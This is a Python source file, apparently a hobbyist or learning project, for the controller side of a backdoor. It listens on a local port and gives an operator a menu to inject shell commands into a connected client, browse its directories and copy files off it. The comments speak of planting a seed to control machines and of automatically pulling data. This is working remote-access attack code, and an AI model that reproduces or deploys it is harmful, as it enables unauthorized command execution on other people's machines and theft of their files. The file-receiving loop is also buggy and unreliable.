import socket # By default UDP, create_connection utilises TCP
import os
from pyfiglet import Figlet # ASCII Art
# Excel for all ASCII randomise?

# don't mask import with same file name


host_ip = "127.0.0.1"
port = 4445

while True:         # While looped the whole program so socket can be reset

    sock = socket.socket()

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # avoid address already in use when server is reset (avoid TIME WAIT)  

    sock.bind((host_ip, port))

    sock.listen(0)

    print("listening...")

    conn, address = sock.accept() # check documentation returns (conn, address), conn is new socket object (hence why we use conn.sendall and recv as more threads can have more different connections, check multithreads?) usable to send and receive data in connection, address is server ip and port

    msg = conn.recv(4096).decode("utf-8")

    print(msg) #

    ####### Banner ########

    banner_font = Figlet(font="pyramid")
    print(banner_font.renderText("NAME"))

    ####### Banner #######

    # while loop

    while True: ###

        print("\n [0] Inject Command \n [1] Check Directory \n [2] Change directory \n [3] Copy file \n [4] Close Backdoor \n") 
        option = str(input("Option :P: "))
        print()
        
        # if 0 then, 1 then etc.

        conn.sendall(bytes(option, "utf-8"))

        if option == "0":
            
            # send
            send_msg = str(input("Inject: "))  # user commands here

            send_msg = bytes(send_msg, "utf-8")

            conn.sendall(send_msg)

            # receive
            output = conn.recv(4096).decode("utf-8")

            print("Output : \n\n" + output)
            
        elif option == "1":
            pwd = conn.recv(4096).decode("utf-8")
            print("You are currently in: " + pwd)
            
        elif option == "2":
            change_dir = input("Navigate which directory? (absolute path): ")

            send_msg = bytes(change_dir, "utf-8")

            conn.sendall(send_msg)


            pwd = conn.recv(4096).decode("utf-8")
            print("Current directory: " + pwd)

        elif option == "3":

            # Pre-req for infiltration
            copy_file_name = input("File name to copy: ")
            copied_file = open(copy_file_name, "wb")    # creates file in this case cause of w (b for binary)

            # Recon 
            conn.sendall(bytes(copy_file_name, "utf-8"))

            # Get File
            # loop_check = True 
            # while loop_check:
            file_content = conn.recv(4096)  # no utf?

            print("\n")
            
            while file_content: # loop copies content of file byte by byte into our copied_file file with the same name
                
                copied_file.write(file_content)

                confirm = conn.recv(4096)
                ################################## Check why file content not sent
                if (confirm == "done"):
                    # exit loop
                    file_content = ""
                    print("done")
                else: 
                    file_content = confirm
                    print("transfer")
                print("Receiving...")
            print("\nFile copied! ;p")

            # Close Socket and reset connection with client (go to main WHILE loop)  
            sock.close()
            break
            
        #elif option == "3": ##########
            #sock.close()
        else:
            print("please try again :{")

        print("\n-----------------------")









    # print(socket.gethostbyname("www.google.com")) # socket function is general (object in documentation is like sock.recv(), more specialised)



    # issue: Port is left open after program finishes executing, vulnerable and is only closed when another port is assigned and server-side program is run again

    # future prototypes: server side can be left running and can block incoming connections autonomously, and automatically inject commands to get data when it establishes connection with client
    # two-way communication chatting, looping send and receives


    # MAIN NEtWORK ARCHIeCtuRE PROBLEM WITH SOCKETS: TIME WAIT, ADDRESS ALREADY IN USE, therefore server has to wait 


    # close and reopen socket client side
    # fix comment code area




    # Quote: GUI is like car's shell/sterring wheel, for looks, but CLI, inner workings of cars can be manipulated, we can plant a seed and control and manipulate it however we want
